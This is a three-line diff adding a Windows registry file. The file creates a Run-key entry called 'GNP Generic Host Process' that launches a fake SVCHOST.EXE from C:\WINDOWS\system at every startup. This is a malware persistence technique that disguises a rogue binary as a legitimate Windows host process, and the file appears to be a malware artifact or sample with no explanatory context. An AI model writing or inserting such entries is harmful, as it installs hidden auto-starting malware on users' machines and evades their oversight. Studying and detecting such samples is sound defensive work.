@@ -1,0 +1,3 @@
+REGEDIT4
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+"GNP Generic Host Process"="C:\\WINDOWS\\system\\SVCHOST.EXE"
